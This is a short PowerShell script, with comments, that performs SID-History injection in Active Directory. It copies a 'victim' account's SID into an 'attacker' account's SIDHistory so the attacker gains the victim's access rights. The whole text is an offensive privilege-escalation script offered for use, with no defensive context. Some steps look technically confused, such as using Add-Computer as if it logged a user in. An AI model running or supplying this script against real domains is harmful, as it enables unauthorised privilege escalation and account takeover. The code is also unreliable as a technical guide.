# Replace these values with the appropriate information
$attackerUser = "attacker"
$targetUser = "victim"
$domain = "dbz.com"

# Get the SID of the attacker and target user
$attackerSID = (Get-ADUser $attackerUser -Properties SID).SID
$targetSID = (Get-ADUser $targetUser -Properties SID).SID

# Add the target user's SID to the attacker user's SID History attribute
Set-ADUser $attackerUser -Add @{'SIDHistory'=$targetSID}

# Log in to the domain using the attacker user's credentials
$cred = New-Object System.Management.Automation.PSCredential($attackerUser, (Get-Credential).Password)
Add-Computer -DomainName $domain -Credential $cred

# Attempt to access resources that the attacker user does not have permissions for
# If the SID-History injection was successful, the attacker user should now have access to these resources